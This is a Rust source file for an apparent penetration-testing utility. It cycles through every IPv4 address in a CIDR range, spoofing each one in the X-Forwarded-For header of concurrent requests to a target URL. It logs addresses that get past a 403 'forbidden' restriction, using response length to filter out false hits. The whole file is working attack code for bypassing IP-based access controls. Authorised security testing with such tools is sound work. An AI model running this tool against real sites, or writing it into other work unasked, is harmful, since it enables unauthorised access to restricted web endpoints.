use cidr::{Cidr, Ipv4Cidr};
use futures::{stream, StreamExt};
use log::{error, info};
use reqwest::{Client, Url};
use std::net::Ipv4Addr;

pub struct BruteForce {
    url: Url,
    client: reqwest::Client,
    content_length: u64,
    addresses: Vec<Ipv4Addr>,
}

impl BruteForce {
    pub fn new(url: Url, content_length: u64, cidr: &str) -> BruteForce {
        let addresses = cidr.parse::<Ipv4Cidr>().unwrap().iter().collect::<Vec<_>>();

        BruteForce {
            url,
            client: Client::new(),
            content_length,
            addresses,
        }
    }

    pub async fn scan(&self) {
        let result = stream::iter(self.addresses.clone())
            .map(|addr| async move {
                (
                    addr,
                    self.client
                        .get(self.url.clone())
                        .header("X-Forwarded-For", addr.to_string())
                        .send()
                        .await,
                )
            })
            .buffer_unordered(10);

        result
            .for_each(|r| async {
                match r.1 {
                    Ok(resp) => {
                        if resp.status().is_success() {
                            if self.content_length != 0 {
                                if let Some(cl) = resp.content_length() {
                                    if cl == self.content_length {
                                        return;
                                    }
                                }
                            }
                            info!(
                                "Got past forbidden with X-Forwarded-For: {:#?}",
                                r.0.to_string()
                            );
                        }
                    }
                    Err(e) => error!("Error: {:#?}", e),
                }
            })
            .await;
    }
}
